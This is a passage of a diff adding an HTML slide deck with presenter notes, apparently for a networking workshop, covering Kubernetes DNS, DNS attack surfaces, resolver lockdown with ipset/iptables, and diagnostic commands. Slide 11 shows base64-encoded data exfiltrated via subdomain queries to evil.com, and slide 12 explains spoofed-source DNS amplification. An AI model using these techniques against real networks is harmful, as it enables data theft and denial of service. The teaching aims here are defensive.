+          <strong>The mental model transfer.</strong> Docker's embedded DNS at 127.0.0.11 is your /etc/resolv.conf, scoped to a container. CoreDNS is your ISP's recursive resolver, scoped to a cluster. The FQDN <span class="mono tc">my-svc.my-ns.svc.cluster.local</span> is a delegation tree exactly like <span class="mono tc">github.com.</span> — just with a different root. Same concept. Different scope.
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">Docker DNS — visible from inside a container</div>
+          <div class="code" style="font-size:.79rem;">
+<span class="cm"># What does a container's resolv.conf look like?</span>
+docker run --rm alpine cat /etc/resolv.conf
+<span class="cm"># → nameserver 127.0.0.11</span>
+<span class="cm"># → options ndots:0</span>
+
+<span class="cm"># Docker's embedded resolver answers container names</span>
+docker run --rm --network my-net alpine \
+  nslookup my-other-container
+<span class="cm"># → resolves to container IP on the bridge</span>
+
+<span class="cm"># The bridge in the routing table</span>
+ip route show | grep br-
+<span class="cm"># → 172.20.0.0/24 dev br-3037a</span>
+<span class="cm"># Same routing table you already know</span>
+          </div>
+        </div>
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.5rem;">Kubernetes DNS — the cluster's delegation tree</div>
+          <div class="code" style="font-size:.79rem;">
+<span class="cm"># Every pod's /etc/resolv.conf</span>
+kubectl exec -it my-pod -- cat /etc/resolv.conf
+<span class="cm"># → nameserver 10.96.0.10  (CoreDNS ClusterIP)</span>
+<span class="cm"># → search my-ns.svc.cluster.local svc.cluster.local</span>
+
+<span class="cm"># Service FQDN breakdown:</span>
+<span class="hgn">my-svc</span>.<span class="hbl">my-ns</span>.<span class="hcy">svc</span>.<span class="ham">cluster.local</span>
+<span class="cm">#  ^svc  ^namespace  ^type  ^cluster domain</span>
+
+<span class="cm"># Short names work because of 'search' domains</span>
+<span class="cm"># "my-svc" expands to the full FQDN automatically</span>
+
+<span class="cm"># Query CoreDNS directly</span>
+kubectl run -it --rm debug --image=busybox \
+  -- nslookup kubernetes.default
+          </div>
+        </div>
+        <div class="callout qgn" style="font-size:.85rem;">
+          <strong>The ndots setting — the K8s DNS trap.</strong> <span class="mono">ndots:5</span> in K8s pod resolv.conf means any name with fewer than 5 dots gets the search domain appended before trying as an absolute name. <span class="mono">curl github.com</span> from a pod first tries <span class="mono">github.com.my-ns.svc.cluster.local</span>, then <span class="mono">github.com.svc.cluster.local</span>, then <span class="mono">github.com.cluster.local</span>, then finally <span class="mono">github.com.</span> — four DNS queries for what looks like one. Real latency impact. Mitigate with trailing dot: <span class="mono">github.com.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="10">
+  <strong>The key insight to land hard:</strong> <span class="say">"Everything we've learned today — /etc/hosts, /etc/resolv.conf, the resolution chain, routing tables, bridges — Docker just does all of that automatically per container. Kubernetes does it per pod at cluster scale. The mental model is identical. The scope changes. The concepts don't."</span><br/><br/>
+  <strong>The ndots trap is worth 60 seconds:</strong> <span class="say">"In Kubernetes, a simple curl to an external domain makes four DNS queries before it gets the right answer. That's a 4x DNS overhead tax on every external connection from a pod. It's real, measurable latency. You fix it by appending a trailing dot to absolute domain names — that tells the resolver it's already fully qualified, skip the search domain expansion."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S11  SECURITY SURFACE
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="11">
+  <div class="gbg"></div><div class="snum">11</div>
+  <div class="content">
+    <div class="kicker r">The security surface — DNS is not just a lookup service</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">DNS can be poisoned, tunneled, split,<br/>and weaponized. Know the attack surface.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ccr cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cr);margin-bottom:.5rem;">⚠ Cache Poisoning — Kaminsky (2008)</div>
+          <p style="font-size:.88rem;color:var(--mut);">Attacker floods a resolver with forged responses, racing to get a malicious record cached before the real answer arrives. Once cached, every client using that resolver gets the attacker's IP. Dan Kaminsky found this affected virtually every DNS implementation simultaneously — the internet had to be patched in coordinated secrecy.</p>
+          <p style="font-size:.84rem;color:var(--mut);margin-top:.4rem;"><strong>DNSSEC</strong> adds cryptographic signatures to records. The trust chain goes root → TLD → authoritative, signed all the way down. Unbound validates them. Without DNSSEC, every cached record is a trust assumption.</p>
+        </div>
+        <div class="card cam cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--am);margin-bottom:.5rem;">⚠ DNS Exfiltration — The Invisible Channel</div>
+          <div class="code" style="font-size:.76rem;margin-bottom:.45rem;">
+<span class="cm"># Data encoded in subdomain queries</span>
+<span class="hgn">dGhpcyBpcyBzdG9sZW4gZGF0YQ</span>.evil.com
+<span class="hgn">bW9yZSBzdG9sZW4gZGF0YQ</span>.evil.com
+<span class="cm"># Attacker's authoritative NS logs every query</span>
+<span class="cm"># Decode base64 → exfiltrated data reassembled</span>
+          </div>
+          <p style="font-size:.86rem;color:var(--mut);">DNS is almost never blocked at firewalls — it's required infrastructure. Attackers encode stolen data in query subdomains and send them to attacker-controlled authoritative servers. Looks like noise. Bypasses almost every perimeter defense. Pi-hole's query anomaly detection is a primitive version of enterprise DNS threat intelligence.</p>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.5rem;">Split-Horizon DNS — same name, different answer</div>
+          <div class="code" style="font-size:.78rem;margin-bottom:.45rem;">
+<span class="cm"># From the internet:</span>
+dig api.company.com  <span class="cm">→ 203.0.113.42 (public ALB)</span>
+
+<span class="cm"># Same query, from inside the VPN:</span>
+dig api.company.com  <span class="cm">→ 10.10.0.50 (private endpoint)</span>
+          </div>
+          <p style="font-size:.86rem;color:var(--mut);">The authoritative server returns different records based on the requester's source IP. Internal clients hit private IPs directly. External clients hit public load balancers. AWS Route53 private hosted zones work exactly this way. This is how your upcoming VPN session will tie back to DNS — the same name resolves differently depending on which resolver you're using.</p>
+        </div>
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.4rem;">/etc/hosts as an attack vector</div>
+          <p style="font-size:.87rem;color:var(--mut);">Because /etc/hosts is checked before DNS, local compromise of that file redirects any name anywhere. Malware that gets root can silently redirect <span class="mono">bank.com</span> to a phishing IP — every application on the machine will follow, because the OS resolution chain says files come first. This is why container runtimes that inject /etc/hosts entries require careful trust boundaries.</p>
+        </div>
+        <div class="callout qsl" style="font-size:.86rem;">
+          <strong>Preview — VPN session.</strong> Split-horizon DNS is the mechanism that makes internal service names work when you're connected to a VPN. The VPN server pushes a private resolver. That resolver has private zone records. Same name, different answer based on which resolver you hit. We'll build this in the WireGuard session.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="11">
+  <strong>DNS exfiltration always surprises the room:</strong> <span class="say">"Raise your hand if you've ever considered that a DNS query could steal data. DNS is almost never blocked at corporate firewalls because if you block DNS, nothing works. Attackers know this. The domain you register, the subdomains you encode data into, the authoritative server you control — that's an exfiltration channel that bypasses almost every perimeter defense. This is why enterprise DNS analytics exists as a product category."</span><br/><br/>
+  <strong>Split-horizon is the seed for the VPN session:</strong> <span class="say">"We'll come back to split-horizon in the WireGuard session. For now just remember: the same name can resolve to different IPs depending on which resolver you use. That's not a bug — it's a feature that makes private infrastructure work."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S12  DNS AMPLIFICATION & RESOLVER LOCKDOWN
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="12">
+  <div class="gbg"></div><div class="snum">12</div>
+  <div class="content">
+    <div class="kicker r">Why you must restrict access to your resolver</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .4rem;">An open resolver is a weapon.<br/>Someone else can fire it.</h2>
+    <div class="g2 r" style="margin-top:.85rem;">
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ccr cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cr);margin-bottom:.5rem;">DNS Amplification — how DDoS weaponizes open resolvers</div>
+          <div class="code" style="font-size:.78rem;margin-bottom:.5rem;">
+<span class="cm"># DNS is UDP — stateless. Source IP is trivially spoofed.</span>
+
+Attacker spoofs src IP = <span class="hcr">victim's IP</span>
+Attacker sends:   small query  (~60 bytes) → open resolver
+Open resolver:    large response (~3000 bytes) → <span class="hcr">victim's IP</span>
+
+Amplification factor: <span class="hcr">50x</span>
+
+<span class="cm"># Attacker expends 1 Gbps → victim absorbs 50 Gbps</span>
+<span class="cm"># With a botnet of 10,000 resolvers...</span>
+          </div>
+          <div style="display:flex;flex-direction:column;gap:.3rem;font-size:.85rem;">
+            <div style="display:flex;gap:10px;"><span class="tcr bld">①</span><div class="tm">Attacker queries for a large record type (ANY, big TXT) using victim's IP as source</div></div>
+            <div style="display:flex;gap:10px;"><span class="tam bld">②</span><div class="tm">Your open resolver does the work and sends the large response to the victim</div></div>
+            <div style="display:flex;gap:10px;"><span class="tc bld">③</span><div class="tm">Multiplied across thousands of open resolvers — victim is flooded</div></div>
+            <div style="display:flex;gap:10px;"><span class="tgn bld">④</span><div class="tm">Traffic looks legitimate — it comes from real DNS servers, not the attacker</div></div>
+          </div>
+        </div>
+        <div class="callout qcr" style="font-size:.86rem;">
+          <strong>Real scale.</strong> The Spamhaus attack (2013) hit 300 Gbps using open DNS resolvers — largest recorded at the time. The Dyn attack (2016) took down Twitter, Netflix, and GitHub by targeting DNS infrastructure directly with Mirai botnet traffic. DNS is not a benign protocol. It is critical infrastructure with a significant attack surface.
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.65rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.5rem;">The right way to lock it down — DOCKER-USER + ipset</div>
+          <p style="font-size:.86rem;color:var(--mut);margin-bottom:.55rem;">Rather than configuring the resolver itself to restrict clients, we use iptables in the DOCKER-USER chain with an ipset allowlist. This enforces the restriction at the kernel level — before the packet even reaches Pi-hole.</p>
+          <div class="code" style="font-size:.78rem;">
+<span class="cm"># Create the allowlist ipset</span>
+sudo ipset create dns-allowed hash:net
+sudo ipset add dns-allowed <span class="hgn">10.10.0.0/24</span>   <span class="cm"># VPN clients</span>
+sudo ipset add dns-allowed <span class="hgn">172.20.0.0/24</span>  <span class="cm"># Docker compose net</span>
+sudo ipset add dns-allowed <span class="hgn">192.168.1.0/24</span> <span class="cm"># LAN</span>
+
+<span class="cm"># DOCKER-USER chain rules (from vpn7)</span>
+<span class="cm"># Rule 4 &amp; 5 — the actual enforcement:</span>
+DROP udp dpt:53 <span class="hcr">! match-set dns-allowed src</span>
+DROP tcp dpt:53 <span class="hcr">! match-set dns-allowed src</span>
+
+<span class="cm"># "Drop DNS from anyone NOT in the allowlist"</span>
+<span class="cm"># Inverse match — deny by exception</span>
+          </div>
+        </div>
+        <div class="card cb cp">
+          <div class="mono" style="font-size:.66rem;letter-spacing:.14em;text-transform:uppercase;color:var(--bl);margin-bottom:.4rem;">Why ipset over individual iptables rules</div>
+          <div style="display:flex;flex-direction:column;gap:.35rem;font-size:.87rem;">
+            <div style="display:flex;gap:10px;"><span class="tc bld">①</span><div class="tm"><strong>O(1) hash lookup</strong> — ipset uses a hash table. 1 rule matches 10,000 IPs with the same overhead as matching 1. Traditional iptables rules are O(n) — every rule is checked in sequence.</div></div>
+            <div style="display:flex;gap:10px;"><span class="tb bld">②</span><div class="tm"><strong>Atomic updates</strong> — add or remove IPs from the set without touching iptables rules. No rule reload, no traffic interruption.</div></div>
+            <div style="display:flex;gap:10px;"><span class="tgn bld">③</span><div class="tm"><strong>Single rule, unlimited members</strong> — one iptables rule enforces the entire allowlist. The set grows without adding complexity to the ruleset.</div></div>
+            <div style="display:flex;gap:10px;"><span class="tam bld">④</span><div class="tm"><strong>Inspectable</strong> — <span class="mono">ipset list dns-allowed</span> shows exactly who is allowed. No need to parse iptables output.</div></div>
+          </div>
+          <div class="code" style="margin-top:.55rem;font-size:.78rem;">
+<span class="cm"># Inspect the allowlist</span>
+sudo ipset list dns-allowed
+
+<span class="cm"># Add a host at runtime — no iptables reload</span>
+sudo ipset add dns-allowed 10.10.0.42
+
+<span class="cm"># Verify the DOCKER-USER rules</span>
+sudo iptables -L DOCKER-USER --line-numbers -n
+          </div>
+        </div>
+        <div class="callout qam" style="font-size:.86rem;">
+          <strong>The civic responsibility point.</strong> You didn't build Pi-hole to be part of a DDoS fleet. But if port 53 is reachable from the internet and you run a recursive resolver, that's exactly what you are — an amplifier waiting to be aimed. Locking down your resolver isn't paranoia. It's the same reason you don't leave your car running with the keys in it.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="12">
+  <strong>The amplification math lands hard when you do it explicitly:</strong> <span class="say">"A 60-byte query produces a 3,000-byte response. That's 50x amplification. An attacker with a 1 Gbps botnet can deliver 50 Gbps to a victim — using YOUR resolver to do it, using YOUR bandwidth, and the traffic traces back to your IP, not theirs. That's the threat model."</span><br/><br/>
+  <strong>The ipset explanation resonates with the engineers in the room:</strong> <span class="say">"Traditional iptables is a linked list. The kernel checks each rule in order. Rule 1, rule 2, rule 3... If you have 500 IP addresses you want to block, that's 500 rule comparisons on every packet. ipset is a hash table. One rule, one hash lookup, done — regardless of whether the set has 10 entries or 10 million. This is the right data structure for the problem."</span><br/><br/>
+  <strong>Show the actual vpn7 DOCKER-USER rules:</strong> <code>sudo iptables -L DOCKER-USER --line-numbers -n</code> — point to rules 4 and 5. <span class="say">"This is the actual enforcement. The exclamation mark is the inverse match — drop if NOT in the set. Everything else gets through. Clean, auditable, fast."</span>
+</div>
+
+
+<!-- ══════════════════════════════════════════
+     S13  TOOLKIT & CLOSING
+══════════════════════════════════════════ -->
+<div class="slide" data-slide="13">
+  <div class="gbg"></div><div class="snum">13</div>
+  <canvas class="pcanvas" style="position:absolute;inset:0;z-index:1;pointer-events:none;"></canvas>
+  <div class="content">
+    <div class="kicker r">The complete toolkit</div>
+    <h2 class="stitle r" style="margin:.3rem 0 .5rem;">Every command. Five questions.<br/>One mental model for the rest of your career.</h2>
+    <div class="g2 r" style="margin-top:.75rem;">
+      <div style="display:flex;flex-direction:column;gap:.55rem;">
+        <div class="card ca cp">
+          <div class="mono" style="font-size:.65rem;letter-spacing:.14em;text-transform:uppercase;color:var(--cy);margin-bottom:.45rem;">DNS toolkit — Ubuntu &amp; RHEL 8</div>
+          <div class="code" style="font-size:.76rem;">
+<span class="cm"># Full recursive trace — run this first, always</span>
+dig <span class="ham">+trace</span> github.com
+
+<span class="cm"># Specific record types</span>
+dig <span class="hbl">A</span> / <span class="hbl">AAAA</span> / <span class="hbl">MX</span> / <span class="hbl">TXT</span> / <span class="hbl">NS</span> github.com
+dig <span class="ham">-x</span> 8.8.8.8   <span class="cm"># reverse PTR</span>
+
+<span class="cm"># Query a specific resolver</span>
+dig <span class="ham">@8.8.8.8</span> github.com
+
+<span class="cm"># Full NSS chain (what apps actually see)</span>
+getent hosts github.com
+
+<span class="cm"># Resolution stack</span>
+cat /etc/nsswitch.conf | grep hosts
+cat /etc/resolv.conf
+resolvectl status    <span class="cm"># Ubuntu</span>
+nmcli dev show | grep DNS  <span class="cm"># RHEL8 alt</span>
+
+<span class="cm"># Flush cache</span>
+sudo resolvectl flush-caches
+sudo systemd-resolve --flush-caches  <span class="cm"># RHEL8</span>
+
+<span class="cm"># Watch DNS queries live</span>
+sudo tcpdump -i any port 53 -n
+          </div>
+        </div>
+        <div class="card cam cp">
+          <div class="mono" style="font-size:.65rem;letter-spacing:.14em;text-transform:uppercase;color:var(--am);margin-bottom:.45rem;">Host networking toolkit</div>
+          <div class="code" style="font-size:.76rem;">
+<span class="cm"># Routing table</span>
+ip route show
+
+<span class="cm"># Which route wins? (the key command)</span>
+ip route get <span class="ham">8.8.8.8</span>
+
+<span class="cm"># ARP / neighbor cache</span>
+ip neigh show
+
+<span class="cm"># Interface state</span>
+ip addr show
+ip link show
+
+<span class="cm"># ipset inspection</span>
+sudo ipset list dns-allowed
+
+<span class="cm"># iptables — filter and nat tables</span>
+sudo iptables -L DOCKER-USER --line-numbers -n
+sudo iptables -t nat -L -n -v
+
+<span class="cm"># Full wire view</span>
+sudo tcpdump -i any host 8.8.8.8 -n
+          </div>
+        </div>
+      </div>
+      <div style="display:flex;flex-direction:column;gap:.55rem;">
+        <div class="card cp">
+          <div class="mono" style="font-size:.65rem;letter-spacing:.14em;text-transform:uppercase;color:var(--mut);margin-bottom:.5rem;">The 5 questions that debug 90% of DNS/network problems</div>
+          <div style="display:flex;flex-direction:column;gap:.4rem;font-size:.9rem;">
+            <div style="display:flex;gap:12px;padding:7px 10px;background:var(--bg4);border-radius:2px;">
+              <span class="tc bld">①</span>
+              <div class="tm">What does DNS actually resolve this name to? <span class="mono tc" style="font-size:.82rem;">dig +trace</span></div>
+            </div>
+            <div style="display:flex;gap:12px;padding:7px 10px;background:var(--bg4);border-radius:2px;">
+              <span class="tb bld">②</span>
+              <div class="tm">Which route does the kernel pick for that IP? <span class="mono tb" style="font-size:.82rem;">ip route get</span></div>
+            </div>
+            <div style="display:flex;gap:12px;padding:7px 10px;background:var(--bg4);border-radius:2px;">
+              <span class="tam bld">③</span>
+              <div class="tm">Is NAT or iptables rewriting/dropping this packet? <span class="mono tam" style="font-size:.82rem;">iptables -L -n</span></div>
+            </div>
+            <div style="display:flex;gap:12px;padding:7px 10px;background:var(--bg4);border-radius:2px;">
+              <span class="tcr bld">④</span>
+              <div class="tm">What does the OS actually resolve (full NSS chain)? <span class="mono tcr" style="font-size:.82rem;">getent hosts</span></div>
+            </div>
+            <div style="display:flex;gap:12px;padding:7px 10px;background:var(--bg4);border-radius:2px;">
+              <span class="tgn bld">⑤</span>
+              <div class="tm">What's actually on the wire? <span class="mono tgn" style="font-size:.82rem;">tcpdump -i any</span></div>
+            </div>
+          </div>
+        </div>
+        <div class="card cs cp">
+          <div class="mono" style="font-size:.65rem;letter-spacing:.14em;text-transform:uppercase;color:var(--sl);margin-bottom:.45rem;">What's coming next</div>
+          <div style="display:flex;flex-direction:column;gap:.3rem;font-size:.87rem;">
+            <div style="display:flex;gap:10px;"><span class="tb bld">→</span><div class="tm"><strong>Docker &amp; container networking</strong> — bridges, namespaces, the embedded DNS resolver, compose networks. Everything here applies.</div></div>
+            <div style="display:flex;gap:10px;"><span class="tc bld">→</span><div class="tm"><strong>Pi-hole &amp; Unbound</strong> — building the DNS stack you've been looking at. ipset allowlist. Blocklists. DNSSEC validation.</div></div>
+            <div style="display:flex;gap:10px;"><span class="tam bld">→</span><div class="tm"><strong>WireGuard &amp; Tailscale</strong> — VPN routing, split-horizon DNS, the NAT table in full. All of this session's concepts, networked together.</div></div>
+          </div>
+        </div>
+        <div class="callout qcy" style="font-size:.88rem;">
+          <strong>The one thing to carry out of this room:</strong> Every network problem is a translation problem. DNS translates names to IPs. Routing translates IPs to interfaces. ARP translates IPs to MACs. NAT translates private IPs to public ones. When something breaks — find the translation that's wrong. That's the whole mental model.
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+<div class="nc" data-for="13">
+  <strong>The challenge to leave them with:</strong> <span class="say">"Tonight — open a terminal on any Linux machine. Run <code>dig +trace google.com</code>. Read every line. Then <code>ip route get 8.8.8.8</code>. Then <code>getent hosts google.com</code>. Then <code>sudo tcpdump -i any port 53 -n</code> while you do a curl in another terminal and watch the DNS query go by. If you can narrate what each of those outputs means, you have the mental model that most developers never build and that every infrastructure engineer relies on every single day."</span><br/><br/>
+  <strong>Expected questions:</strong><br/>
+  • "How does K8s networking differ from Docker?" → <span class="say">"Same primitives but CoreDNS replaces the embedded Docker resolver and there's a full SDN layer (CNI plugin) managing the bridge and routing. Same mental model — more moving parts."</span><br/>
+  • "What about IPv6?" → <span class="say">"AAAA records instead of A. Same hierarchy, same resolution chain, same routing concepts. 128-bit addresses instead of 32-bit. No NAT required — address space is large enough for every device. Most of today applies directly."</span><br/>
+  • "How does Route53 fit in?" → <span class="say">"Route53 is a managed authoritative DNS service. Private hosted zones give you split-horizon inside a VPC. The Resolver is essentially managed Unbound. Everything maps."</span>
+</div>
+
+
+</div><!-- /stage -->
+
+<!-- NOTES PANEL -->
+<div class="npanel" id="np">
+  <div class="nhdr">
+    <span>🎤 Presenter Notes — Slide <span id="nsn">1</span></span>
+    <span>Shift+P to unlock · N to toggle · audience sees nothing</span>
+  </div>
+  <div class="nbody" id="nb">Loading…</div>
+</div>
+</div><!-- /shell -->
+
+<!-- NAV -->
+<div class="nav">
+  <button class="nbtn" onclick="go(cur-1)">&#8249;</button>
+  <div class="dots" id="dots"></div>
+  <button class="nbtn" onclick="go(cur+1)">&#8250;</button>
+  <span class="ctr" id="ctr">1 / 13</span>
+  <button class="ntbtn" id="ntbtn" onclick="toggleNotes()">Notes</button>
+</div>
+
+<script>
+let cur=1, notesOpen=false, pm=false;
+const slides=document.querySelectorAll('.slide');
+const total=slides.length;
+const dotsEl=document.getElementById('dots');
+
+for(let i=1;i<=total;i++){
+  const d=document.createElement('div');
+  d.className='dot'+(i===1?' on':'');
+  d.onclick=()=>go(i);
+  dotsEl.appendChild(d);
+}
+
+function getNotes(n){
+  const el=document.querySelector(`.nc[data-for="${n}"]`);
+  return el?el.innerHTML:'<span style="color:var(--mut)">No notes.</span>';
+}
+
+function go(n){
+  if(n<1)n=total;
+  if(n>total)n=1;
+  document.querySelector('.slide.active')?.classList.remove('active');
+  const s=document.querySelector(`.slide[data-slide="${n}"]`);
+  if(s){s.classList.add('active');reveal(s);}
+  cur=n;
+  document.querySelectorAll('.dot').forEach((d,i)=>d.classList.toggle('on',i+1===n));
+  document.getElementById('ctr').textContent=n+' / '+total;
+  document.getElementById('prog').style.width=((n/total)*100)+'%';
+  if(pm&&notesOpen){
+    document.getElementById('nb').innerHTML=getNotes(n);
+    document.getElementById('nsn').textContent=n;
+  }
+}
+
+function toggleNotes(){
+  if(!pm)return;
+  notesOpen=!notesOpen;
+  document.getElementById('np').classList.toggle('open',notesOpen);
+  if(notesOpen){
+    document.getElementById('nb').innerHTML=getNotes(cur);
+    document.getElementById('nsn').textContent=cur;
+  }
+  document.getElementById('ntbtn').textContent=notesOpen?'Hide':'Notes';
+}
+
+document.addEventListener('keydown',e=>{
+  if(e.key==='ArrowRight'||e.key===' '){e.preventDefault();go(cur+1);}
+  if(e.key==='ArrowLeft'){e.preventDefault();go(cur-1);}
+  if(e.key==='P'&&e.shiftKey){pm=!pm;document.body.classList.toggle('pm',pm);
+    if(!pm&&notesOpen){notesOpen=false;document.getElementById('np').classList.remove('open');}}
+  if(e.key.toLowerCase()==='n'&&pm)toggleNotes();
+});
+
+let tx=0;
+document.addEventListener('touchstart',e=>{tx=e.touches[0].clientX;});
+document.addEventListener('touchend',e=>{
+  const d=tx-e.changedTouches[0].clientX;
+  if(Math.abs(d)>48)go(cur+(d>0?1:-1));
+});
+
+document.addEventListener('mousemove',e=>{
+  document.getElementById('spot').style.background=
+    `radial-gradient(500px circle at ${e.clientX}px ${e.clientY}px,rgba(0,212,245,.04),transparent 42%)`;
+});
+
+function reveal(slide){
+  slide.querySelectorAll('.r').forEach((el,i)=>{
+    el.style.transition='none';el.style.opacity='0';el.style.transform='translateY(12px)';
+    el.offsetHeight;
+    el.style.transition=`opacity .3s ease ${i*.055}s,transform .3s ease ${i*.055}s`;
+    el.style.opacity='1';el.style.transform='translateY(0)';
+  });
+}
+
+function initParticles(canvas){
+  if(!canvas)return;
+  const ctx=canvas.getContext('2d');
+  canvas.width=canvas.offsetWidth||window.innerWidth;
+  canvas.height=canvas.offsetHeight||window.innerHeight;
+  const p=Array.from({length:35},()=>({
+    x:Math.random()*canvas.width,y:Math.random()*canvas.height,
+    vx:(Math.random()-.5)*.2,vy:(Math.random()-.5)*.2,
+    s:Math.random()*1.6+.4,a:Math.random()*.18+.04
+  }));
+  let mx=-9999,my=-9999;
+  canvas.addEventListener('mousemove',e=>{const r=canvas.getBoundingClientRect();mx=e.clientX-r.left;my=e.clientY-r.top;});
+  canvas.addEventListener('mouseleave',()=>{mx=-9999;my=-9999;});
+  (function loop(){
+    ctx.clearRect(0,0,canvas.width,canvas.height);
+    p.forEach(q=>{
+      const dx=q.x-mx,dy=q.y-my,d=Math.sqrt(dx*dx+dy*dy);
+      if(d<80){const f=(80-d)/80*1.2;q.vx+=(dx/d)*f*.07;q.vy+=(dy/d)*f*.07;}
+      q.vx*=.987;q.vy*=.987;
+      q.x+=q.vx;q.y+=q.vy;
+      if(q.x<0)q.x=canvas.width;if(q.x>canvas.width)q.x=0;
+      if(q.y<0)q.y=canvas.height;if(q.y>canvas.height)q.y=0;
+      ctx.beginPath();ctx.arc(q.x,q.y,q.s,0,Math.PI*2);
+      ctx.fillStyle=`rgba(0,212,245,${q.a})`;ctx.fill();
+    });
+    requestAnimationFrame(loop);
+  })();
+}
+
+document.querySelectorAll('.pcanvas').forEach(initParticles);
+go(1);
+</script>
+</body>
+</html>
